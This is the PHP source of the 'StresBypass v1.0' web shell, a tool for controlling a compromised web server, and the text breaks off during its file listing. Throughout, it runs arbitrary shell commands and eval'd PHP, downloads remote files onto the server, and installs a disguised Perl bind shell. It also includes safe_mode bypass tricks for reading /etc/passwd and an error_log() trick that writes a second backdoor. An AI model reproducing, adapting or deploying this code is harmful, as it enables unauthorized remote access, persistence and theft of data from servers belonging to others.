
<?
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
/**********************************************************/
/*                          StresBypass v1.0
/*                       --------- ----------
/*
/*                 By Stres // Biyosecurity.Com
/*              ------------------------------------------------
/*               Biyo Security Center Team
/*            mail : stres@biyosecurity.com
/* 
/*
/*********************************************************/
?>
<?$dir=realpath("./")."/";
$dir=str_replace("\\","/",$dir);
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa"><title>
StresBypass shell</title>
<style>
   td {
   font-family: verdana, arial, ms sans serif, sans-serif;
   font-size: 11px;
   color: #D5ECF9;
   }
   BODY {
   margin-top: 4px;
   margin-right: 4px;
   margin-bottom: 4px;
   margin-left: 4px;
   scrollbar-face-color: #b6b5b5;
   scrollbar-highlight-color: #758393;
   scrollbar-3dlight-color: #000000;
   scrollbar-darkshadow-color: #101842;
   scrollbar-shadow-color: #ffffff;
   scrollbar-arrow-color: #000000;
   scrollbar-track-color: #ffffff;
   }
   A:link {COLOR:blue; TEXT-DECORATION: none}
   A:visited { COLOR:blue; TEXT-DECORATION: none}
   A:active {COLOR:blue; TEXT-DECORATION: none}
   A:hover {color:red;TEXT-DECORATION: none}
   input, textarea, select {
   background-color: #EBEAEA;
   border-style: solid;
   border-width: 1px;
   font-family: verdana, arial, sans-serif;
   font-size: 11px;
   color: #333333;
   padding: 0px;
   }
  </style></head>
<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
    <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
<p align="center"> </p>
    <p align="center">
<a bookmark="minipanel">
    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina">By Stres</font><span lang="en-us"><font size="3" face="Martina"> </font>
    <br><font size="1" face="Arial"></font></span><font color="#FFFF00" face="Arial" size="4"> <span lang="en-us">2oo8-2oo9</span>     </font>
<font color="#FFFF00" face="Arial" size="5"><span lang="en-us">v1.0</span></font></p>
</p>
<a bookmark="minipanel">
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
<p align="center">
    <b>
    <?
    $dirfile="$file_to_download";
if (file_exists("$dirfile"))
{
header("location: $dirfile");
}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
$safemode = true;
$hsafemode = "<font color=\"red\">ON (secure)</font>";


}

else {$safemode = false; $hsafemode = "<font color=\"green\">Kapal‎ ( GüvenLik Kapal‎ )</font>";}
echo("Mod: $hsafemode");
// PHPINFO
if ($_GET['action'] == "phpinfo") {
    echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() b? c?m";
    exit;
}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">Kapal‎ ( GüvenLik Kapal‎ )</font>";}
echo("<br>");
echo("Open base dir: $hopenbasedir");
echo("<br>");
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>Aç‎k</font></b>";}else{echo "<font color=red>Kapal‎</font></b>";}
echo("<br>");
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>Aç‎k</font></b>";}else{echo "<font color=red>Kapal‎</font></b>";}
echo("<br>");
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>Aç‎k</font></b>"; } else { echo "<font color=red>Kapal‎</font></b>"; }
echo("<br>");
echo "PHP version: <b>".@phpversion()."</b>";
echo("<br>");
echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b>"):("<b><font color=red>OFF</font></b>"));

echo("<br>");
echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>Hiç</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);

?>
</b></p>
    <p align="center"> </p></td></tr></table>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
    <b>
</b></p>
    <p align="center"> </p></td></tr></table>

</a>



</p>
    <p align="center"><font color="#FFFF00"> </font></p>
    <p align="center"></p>
    </th></tr><tr>
        <td bgcolor="#000000" style="color: #DCE7EF">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font size="4px">
<b>
        <font size="1" face="Verdana" color="#DCE7EF">OS:</font><font color="#DCE7EF" size="-2" face="verdana"><font size="1" face="Arial"> <?php echo php_uname(); ?> </font></span></font></b><p>
<font size="1" face="Verdana" color="#DCE7EF">Server:</font><font color="#DCE7EF" size="1" face="Arial"> </font><font color="#DCE7EF" size="1" face="Arial"><?php echo(htmlentities($_SERVER['SERVER_SOFTWARE'])); ?> </font></font>
</font>
</p>
</font>
<font size=1 face=Verdana>
<p align="left"><font color="#DCE7EF">User</font></font><font size="1" face="Verdana" color="#DCE7EF">:</font><font size=-2 face=verdana color="#00000"> </font>
</b>
    </font>
    </font>
    <a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none">
<font size=-2 face=verdana color="#FFFFFF">
<? passthru("id");?></font><font size=-2 face=verdana color="black"><br>
    </font>
</a><span lang="en-us"><font face="Wingdings" size="3" color="#FFFFFF">1</font></span><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><font size="-2" face="verdana"><font size=-2 face=Verdana color="#DCE7EF">:</font><font size=-2 face=verdana color="#DCE7EF">
<? echo getcwd();?></div></font></font></a></font></b></a></font><br>

<br> <b><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px"><font color="#FF0000" face="Verdana" size="-2">
</font></font><font color="#FF0000" face="Verdana" size="2">
 </font></a><font size=2 face=verdana></a></font><font face="Verdana" size="2"> </font><a href=# onClick=location.href="javascript:history.back(-1)" style="color: white; text-decoration: none"><font face=Verdana><font color="#CC0000" size="1" face="verdana">Back</font><font color="#DCE7EF" size="1" face="verdana"> </font>

    </font></a><font face="Wingdings" size="1" color="#C0C0C0">?</font><span lang="en-us"><font size="1" color="#C0C0C0" face="Webdings">
</font></span><font face=Verdana color="white"><font color="#CC0000" size="1"><a target="\"_blank\"" style="text-decoration: none" title="??????? ???Php" href="?action=phpinfo"><font color="#CC0000">phpinfo</font></a></font><font size="1"></a></font></font></b><span lang="en-us"><font color="#C0C0C0" face="Wingdings" size="1">2</font></span><b><font size=1 face=verdana>
</font>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="1"> </font></font><font face="verdana" color="white"><span lang="en-us"><a title="???????" href="?act=tools"><font color=#CC0000 size="1">Tools</font></a></span></font><a bookmark="minipanel" style="color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Wingdings 2" size="1">4</font></span></a><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
</font>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us"> </span> </font></font>
<font face="verdana" color="white"><span lang="en-us">
<a title="???????" href="?act=decoder"><font color=#CC0000 size="1">Decoder</font></a></span></font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><span lang="en-us"><font color=#C0C0C0 face="Webdings" size="1">i</font></span></a><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
</font>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us"> </span> </font>
    </font><span lang="en-us"><font face="verdana" color="white">
    <font color=#CC0000 size="1">
<a title="????? ??????" href="?act=bypass"><font color="#CC0000">ByPass</font></a></font><font size="1"></a></font></font><font face="Webdings" size="1" color="#C0C0C0">`</font></span><font size="1" face="verdana" color="white"></a></font><font size=1 face=verdana>
</font>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us"> </span> </font>
    </font><font face="verdana" color="white"><span lang="en-us">
<a title="??????? ?????? ????????" href="?act=SQL"><font color=#CC0000 size="1">SQL</font></a></span></font></b><font face="Webdings" size="1" color="#C0C0C0">?</font><b><font size="1" face="verdana" color="white"></a></font></b><font size="1"></font></font><b><font size=1 face=verdana>
</font></b><font size="4px"><b>
<font size="4px" face="verdana" color="white">
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF face="Verdana" size="1"><span lang="en-us"> </span></font></font></b></font><b><span lang="en-us"><font face="verdana" color="white"><a title="bind shell" href="?act=bindport"><font color=#CC0000 size="1">Bind</font></a></font></span></b><font face="Webdings" size="1" color="#C0C0C0">?</font><font size="4px"><b><font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="1"> </font>
    </font></b></font><font face="verdana" color="white">
    <b>
    <span lang="en-us"><font color=#CC0000 size="1">
<a title="????????" href="?act=help"><font color="#CC0000">help</font></a></font></span><font size="1"></a></font></b></font><b><font size="1"></a></font><font size=1 face=verdana>
</font><span lang="en-us"><font color="#C0C0C0" face="Webdings" size="1">s</font></span><font face="verdana" color="white"><span lang="en-us"><font color=#CC0000 size="1"><a title="???????" href="?act=about"><font color="#CC0000">about</font></a></font></span><font size="1"></a></font></font><font size="1"></a></font><font size=1 face=verdana>
</font></b><span lang="en-us"><font size=1 face=Wingdings color="#C0C0C0">
?</font></span></p>
<p><font size="4px"><font size=-2 face=verdana color=white><font size="4px" face="Verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font color=#DCE7EF face="Verdana" size="-2">
[</font></a></font><a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none"><font face="Webdings" color="#DCE7EF">j</font></a><font color=#CC0000 face="Verdana" size="-2"> </font>

<font size="4px">
    <font size="4px" face="verdana" color="white"><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
    <font size=-2 face=verdana color=#CC0000>server </font>
    <font size="1" face="verdana" color="#CC0000">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php echo $SERVER_NAME; ?>
    </font></a></font>
</a></font>
</font><b>
<a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
<font color=#DCE7EF size="-2" face="verdana">]  </font>
<font size=-2 face=verdana color=white>
    <font size="4px" face="verdana" color="white">
    <a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
    <font face=Verdana size=-2 color="#008000">
    CGI v</font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php echo $GATEWAY_INTERFACE; ?>         </font>
    <font face=Verdana size=-2 color="#008000"> HTTP v</font></a></font><font size="1" face="verdana">:</font><font size="4px" face="verdana" color="DCE7EF"><font face=Verdana size=-2> <?php echo $SERVER_PROTOCOL; ?></font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font face=Verdana size=-2><font size=-2 face=verdana color=#DCE7EF> </font><font size=-2 face=verdana color=#008000>Mail 
admin</font></font><font size="1" face="verdana" color="#DCE7EF">:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php echo $SERVER_ADMIN; ?>     </font><font face=Verdana size=-2 color="black">   </font></a></font>
</font>
    </b>
</font></a>  <br>

<font size="4px">
<b>
<font size=-2 face=verdana color=white>
    <font face=Verdana size=-2 color="#CC0000">
    <a bookmark="minipanel" style="font-weight: normal; font-family: verdana; text-decoration: none">
    <font face="Wingdings" size="3" color="#000000">:</font></a></font><font size=-2 face=verdana color=#CC0000>  </font><font face="Verdana" size="-2" color="#CC0000">IP</font><a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none"><font size="4px" face="verdana" color="white"><font face=Verdana size=-2>
    </font><font size="1" face="verdana"> </font></font><font size="1" face="verdana" color="#CC0000">SERVER:</font><font face=Verdana size=-2 color="#DCE7EF"> <?php echo $SERVER_ADDR; ?>
    </font>
    </a>

<font size="4px">
</a>
<font size=-2 face=verdana color=white>

            
</font></font>
    <a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
    <font size="4px"><font face=Verdana size=-2 color="black">                
    </font>
    <font size="4px" face="verdana" color="white"><font face=Verdana size=-2 color="#008000">
port
    </font><font size="1" face="verdana" color="#000000">:</font><font face=Verdana size=-2 color="red"> <?php echo $SERVER_PORT; ?>
    </font></font>
    </font>
    </font>
    </b>
</font></p></td></tr></table>
<?
if ($act == "help") {echo "<center><b>?????? ????? ????? ???? ???????<br><br>????? ????????<br>??? ???? ???????? ???? ??? ??? ?????? ?????? ?????? ??????<br>?????? ?? ??????? ??????   </a>.</b>";}
if ($act == "bindport"){
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<b>/bin/bash</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">
<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Connect\"></form></div>";
}
if ($act == "tools"){
    echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
Dosya Düzenle:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
<table id=tb><tr><td>
<INPUT type=\"hidden\" name=\"php\" value=\"yes\">
<INPUT type=\"submit\" value=\"eval code\" id=input></form></div></td></table>";
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>Buradan فndir:</b>:
<INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
<b>-->>:</b>
<INPUT type=\"text\" name=\"fileto\" size=30>
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\"></td><td>
<INPUT type=\"submit\" value=\"Download\" id=input></td></tr></table></form></div>";
}
if ($act == "about") {echo "<center><b>Coding by:<br><br>By Stres<br>&<br><br>-----<br><br>Biyo Security Team<br><br>Bypass Version:1.0 Beta phpshell code<br>Turkiye</a>.</b>";}

if ($act == "bind") {echo "<center><b>By Stres:<br><br>-Connect ?? ?????? ??? ????.<br>.- ??? ????? ????? ???????? ???????<br>.-???? ????? ???? ??? ????? ???<br>nc -lp 3333?????? ?????? - <br>???????? ???? ?????? <br>Bind port to  :<br> bind shell ?????? ? ??   </a>.</b>";}

if ($act == "command") {echo "<center><b>By Stres:<br><br>??????? ??????? ???????  Select ------ x  ???? ??? ??????<br>.- ???? ???? ?????  ??????? ????? ?? ????? ???????<br>Command   </a>.</b>";}

if ($act == "team") {echo "<center><b>By Stres<br><br>BiyoSecurityTeam<br><br> </a>.</b>";}
if (array_key_exists('image', $_GET)) {
    header('Content-Type: image/gif');
    die(getimage($_GET['image']));
}

if ($act == "bypass") {
echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
<table id=tb><tr><td>Uygula:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\"></td></tr></table>
";
echo ("<FONT COLOR=\"RED\"> bypass safemode with copy </FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>read file :
<INPUT type=\"text\" name=\"copy\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with CuRl</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>read file :
<INPUT type=\"text\" name=\"curl\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with imap()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td><select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>
<INPUT type=\"text\" name=\"string\" size=30 value=\"/etc/passwd\">
<INPUT type=\"submit\" value=\"show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> bypass safemode with id()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<select name=plugin><option>cat /etc/passwd</option></select>
<INPUT type=\"submit\" value=\"Show\" id=input></td></tr></table></form></div>";
echo ("<FONT COLOR=\"RED\"> Exploit: error_log()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<INPUT type=\"text\" name=\"ERORR\" size=30 value=\"\">
<INPUT type=\"submit\" value=\"Write\" id=input></td></tr></table></form></div>";
}
if ($act == "decoder"){
echo ("<FONT COLOR=\"RED\"> replace Chr()</FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td>
<textarea name=\"Mohajer22\" cols=\"50\" rows=\"15\" wrar=\"off\">
</textarea><br>
<INPUT type=\"submit\" value=\"Replace\" id=input></td></tr></table></form></div>";
}
if ($act == "SQL"){
echo ("<FONT COLOR=\"RED\">   MySQL    </FONT>");
echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<table id=tb><tr><td> Username :
<INPUT type=\"text\" name=\"username\" size=30 value=\"\">\n
password :
<INPUT type=\"password\" name=\"password\" size=30 value=\"\">\n
<input type=submit value='Enter'>\n
<input type=reset value='Clear'></td></tr></table></form></div>";
}
?>



<br>
<TABLE style="BORDER-COLLAPSE: collapse; color:#000000" cellSpacing=0 borderColorDark=#DCE7EF cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#C0C0C0 border=1><tr>
    <td width="100%" valign="top" style="color: #00000" bgcolor="#000000">
    <a bookmark="minipanel" style="font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none">
    <TABLE style="BORDER-COLLAPSE: collapse; font-family:Verdana; font-size:11px; color:#000000; background-color:#0000000" height=1 cellSpacing=0 borderColorDark=#000000 cellPadding=0 width="100%" bgColor=#000000 borderColorLight=#DCE7EF border=1>
    <tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
    <td width="990" height="1" valign="top" style="border:1px solid #00000; font-family: Verdana; color: #000000; font-size: 11px; "><p align="center">
     </p>
    <p align="center"> <table style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
        <tr style="font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: red; background-color: #0000000">
            <td style="font-size: 13px; font-family: verdana, arial, helvetica; color: red; background-color: #0000000">
<?php
// chr() //
if(empty($_POST['Mohajer22'])){
} else {
$m=$_POST['Mohajer22'];
$m=str_replace(" ","",$m);
$m=str_replace("(","",$m);
$m=str_replace(")","",$m);
$m=str_replace(".",";",$m);
$m=str_replace("chr","&#",$m);
$m=str_replace(" ","",$m);
echo $m ;
}
// ERORR //
if(empty($_POST['ERORR'])){
} else {
$ERORR=$_POST['ERORR'];
echo  error_log("
<html>
<head>
<title> Exploit: error_log() By * StresBypass  * </title>
<body bgcolor=\"#000000\">
<table Width='100%' height='10%' bgcolor='#8C0404' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> By  * StresBypass * BiyoSecurityTeam</font></center></td>
</tr>
</table>
<font color='#FF0000'>
</head>
<?
if(\$fileup == \"\"){
ECHO \" reade for up \";
}else{
\$path= exec(\"pwd\");
\$path .= \"/\$fileup_name\";
\$CopyFile = copy(\$fileup,\"\$path\");
if(\$CopyFile){
echo \" up ok \";
}else{
echo \" no up \";
}
}
if(empty(\$_POST['m'])){
} else {
\$m=\$_POST['m'];
echo  system(\$m);
}
if(empty(\$_POST['cmd'])){
} else {
\$h=  \$_POST['cmd'];
print include(\$h) ;
   }


?>
<form method='POST' enctype='multipart/form-data' action='stresbypass.php'>
<input type='file' name='fileup' size='20'>
<input type='submit' value='  up  '>
</form>
<form method='POST'  action='stresbypass.php'>
<input type='cmd' name='cmd' size='20'>
<input type='submit' value='  open (shill.txt) '>
</form>
<form method='POST' enctype='multipart/form-data' action='stresbypass.php'>
<input type='text' name='m' size='20'>
<input type='submit' value='  run  '>
<input type='reset' value=' reset '>
</form>
", 3,$ERORR);
}
// id //
if ($_POST['plugin'] ){


                                  switch($_POST['plugin']){
                                 case("cat /etc/passwd"):
                                           for($uid=0;$uid<6000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "<br>";
                                                }
                                        }

                                break;


                                                }
                                               }

// imap //
$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
$stream = imap_open($string, "", "");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
} elseif ($string && $switch == "dir") {
$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");

$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]"."<p> </p>" ;
echo "</pre>";
imap_close($stream);
}
// CURL //
if(empty($_POST['curl'])){
} else {
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
}

// copy//
$u1p="";
$tymczas="";
if(empty($_POST['copy'])){
} else {
$u1p=$_POST['copy'];
$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$u1p, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
}

@$dir = $_POST['dir'];
$dir = stripslashes($dir);

@$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
$REQUEST_URI = $_SERVER['REQUEST_URI'];
$dires = '';
$files = '';




if (isset($_POST['port'])){
$bind = "
#!/usr/bin/perl

\$port = {$_POST['port']};
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in(\$port, INADDR_ANY));
listen(S, 50);
while(1)
{
    accept(X, S);
    unless(fork)
    {
        open STDIN, \"<&X\";
        open STDOUT, \">&X\";
        open STDERR, \">&X\";
        close X;
        exec(\"/bin/sh\");
    }
    close X;
}
";}

function decode($buffer){

return  convert_cyr_string ($buffer, 'd', 'w');

}



function execute($com)
{

if (!empty($com))
{
  if(function_exists('exec'))
   {
    exec($com,$arr);
   echo implode('
',$arr);
   }
  elseif(function_exists('shell_exec'))
   {
    echo shell_exec($com);


   }
  elseif(function_exists('system'))
{

    echo system($com);
}
  elseif(function_exists('passthru'))
   {

    echo passthru($com);

   }
}

}


function perms($mode)
{

if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}






if(isset($_POST['post']) and $_POST['post'] == "yes" and @$HTTP_POST_FILES["userfile"][name] !== "")
{
copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
}

if((isset($_POST['fileto']))||(isset($_POST['filefrom'])))

{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "<center><div id=logostrip>Download - OK. (".$sizef."??)</div></center>";
}
else
{
print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
}
}

if (isset($_POST['installbind'])){

if (is_dir($_POST['installpath']) == true){
chdir($_POST['installpath']);
$_POST['installpath'] = "temp.pl";}


$fp = fopen($_POST['installpath'], "w");
fwrite($fp, $bind);
fclose($fp);

exec("perl " . $_POST['installpath']);
chdir($dir);


}


@$ef = stripslashes($_POST['editfile']);
if ($ef){
$fp = fopen($ef, "r");
$filearr = file($ef);



$string = '';
$content = '';
foreach ($filearr as $string){
$string = str_replace("<" , "<" , $string);
$string = str_replace(">" , ">" , $string);
$content = $content . $string;
}

echo "<center><div id=logostrip>Edit file: $ef </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=100 rows=20>$content</textarea>
<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
<input type=\"submit\" name=\"submit\" value=\"Save\" id=input></form></center>";
fclose($fp);
}

if(isset($_POST['savefile'])){

$fp = fopen($_POST['savefile'], "w");
$content = stripslashes($content);
fwrite($fp, $content);
fclose($fp);
echo "<center><div id=logostrip>saved -OK!</div></center>";

}


if (isset($_POST['php'])){

echo "<center><div id=logostrip>eval code<br><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=100 rows=20></textarea><br>
<input type=\"submit\" name=\"submit\" value=\"Exec\" id=input></form></center></div>";
}



if(isset($_POST['phpcode'])){

echo "<center><div id=logostrip>Results of PHP execution<br><br>";
@eval(stripslashes($_POST['phpcode']));
echo "</div></center>";


}


if ($cmd){

if($sertype == "winda"){
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}
else{
ob_start();
echo decode(execute($cmd));
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}

if (trim($buffer)){
echo "<center><div id=logostrip>Command: $cmd<br><textarea cols=100 rows=20>";
echo decode($buffer);
echo "</textarea></center></div>";
}

}
$arr = array();

$arr = array_merge($arr, glob("*"));
$arr = array_merge($arr, glob(".*"));
$arr = array_merge($arr, glob("*.*"));
$arr = array_unique($arr);
sort($arr);
echo "<table><tr><td>Name</td><td><a title=\"Type of object\">Type</a></td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td><a title=\"If Yes, you have write permission\">Write</a></td><td><a title=\"If Yes, you have read permission\">Read</a></td></tr>";

foreach ($arr as $filename) {

if ($filename != "." and $filename != ".."){

if (is_dir($filename) == true){
$directory = "";
$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . perms(fileperms($filename));
if (is_writable($filename) == true){
